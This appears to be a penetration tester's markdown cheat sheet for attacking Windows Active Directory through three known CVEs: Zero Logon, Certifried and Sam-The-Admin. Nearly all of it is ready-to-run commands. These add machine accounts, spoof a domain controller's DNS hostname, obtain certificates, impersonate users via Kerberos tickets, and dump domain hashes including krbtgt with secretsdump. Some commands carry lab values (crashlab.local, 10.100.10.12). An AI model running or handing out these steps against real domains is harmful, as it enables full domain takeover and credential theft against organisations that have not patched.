# Windows

## CVE-2020-1472 : Zero Logon
PoC based on this link : <https://github.com/dirkjanm/CVE-2020-1472>
```bash
python3 cve-2020-1472-exploit.py HOSTNAME IP
impacket-secretsdump 'HOSTNAME$@IP'
```

## CVE-2022-26923 : Certifried
More info in : <https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html>
By default, a user can create at least 10 computers. To verify this, check if ms-DS-MachineAccountQuota > 0 :
```bash
python3 bloodyAD.py -d DOMAIN -u USERNAME -p PASSWORD --host DC_IP getObjectAttributes 'DC=domain,DC=local' ms-DS-MachineAccountQuota
```
If it's okay, just add a computer with bloodyAD :
```bash
python3 bloodyAD.py -d DOMAIN -u USERNAME -p PASSWORD --host DC_IP addComputer COMPUTER_NAME 'COMPUTER_PASSWORD'
```
Then, set the dNSHostname attribute to match the domain controller dNSHostname attribute (for exemple DC.domain.local) :
```bash
python3 bloodyAD.py -d DOMAIN -u USERNAME -p PASSWORD --host DC_IP setAttribute 'CN=COMPUTER_NAME,CN=Computers,DC=domain,DC=local' dNSHostName '["DC.domain.local"]'
```
Use certipy to request a certificate for the computer, using default 'Machine' template & ADCS IP address. This will create a .pfx file, corresponding to the certificate issued by the CA :
```bash
certipy req 'domain.local/COMPUTER_NAME$:COMPUTER_PASSWORD@ADCS_IP' -template Machine -dc-ip DC_IP -ca CA_NAME
```

```bash              

certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12 OR openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes | python3 bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$'
getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
cp emacron.ccache /tmp/
export KRB5CCNAME=/tmp/emacron.ccache
impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
```

## CVE-2021-42278 & CVE-2021-42287 : Sam-The-Admin
Impersonate DA from standard domain user. Based on <https://github.com/WazeHell/sam-the-admin>
```bash
python3 sam_the_admin.py -domain-netbios NETBIOS_NAME -dc-ip IP_DC -shell 'DOMAIN/USERNAME:PASSWORD'
```
